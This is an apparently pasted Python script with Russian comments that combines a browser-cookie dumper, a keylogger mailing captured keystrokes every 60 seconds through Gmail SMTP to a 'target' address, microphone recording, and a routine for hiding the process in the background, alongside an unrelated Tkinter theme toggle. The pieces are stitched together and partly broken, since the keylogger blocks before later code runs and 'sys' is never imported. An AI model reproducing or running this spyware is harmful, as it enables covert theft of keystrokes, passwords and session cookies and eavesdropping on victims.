jamshed
import requests
from bs4 import BeautifulSoup
import browser_cookie3
import pyotp
import telebot
import os
import smtplib
import keyboard
import pyaudio
import wave
import tkinter as tk
from threading import Timer
from datetime import datetime



# Загрузка cookies из браузера
def get_browser_cookies():
    cookies = browser_cookie3.load()  # Загрузка cookies из браузера
    for cookie in cookies:
        print(f"Name: {cookie.name}, Value: {cookie.value}, Domain: {cookie.domain}")

# Генерация OTP-кода
def generate_otp():
    totp = pyotp.TOTP("base32secret3232")
    otp_code = totp.now()
    print(f"Generated OTP: {otp_code}")



# Логирование клавиш
log = ""

def callback(event):
    global log
    log += event.name

def send_log():
    global log
    if log:
        # Отправка лога по email
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login("your_email@gmail.com", "your_password")
        server.sendmail("your_email@gmail.com", "target_email@gmail.com", log)
        server.quit()
        log = ""
    Timer(60, send_log).start()  # Отправка лога каждые 60 секунд

keyboard.on_release(callback)
Timer(60, send_log).start()
keyboard.wait()

# Запись аудио
def record_audio(filename, duration=5):
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024

    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)

    frames = []

    for _ in range(0, int(RATE / CHUNK * duration)):
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()

    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

# Тема переключателя для Tkinter
def toggle_theme():
    if root["bg"] == "white":
        root["bg"] = "black"
        label["fg"] = "white"
    else:
        root["bg"] = "white"
        label["fg"] = "black"

root = tk.Tk()
root.title("Theme Toggle")

label = tk.Label(root, text="Hello, World!", bg=root["bg"])
label.pack()

button = tk.Button(root, text="Toggle Theme", command=toggle_theme)
button.pack()

root.mainloop()

# Запуск кода в фоновом режиме
def run_in_background():
    if os.name == "nt":
        # Для Windows
        import win32api
        win32api.FreeConsole()
    else:
        # Для Linux/macOS
        if os.fork():
            sys.exit()

# Пример использования
run_in_background()
для установка
pip install -r requirements.txt

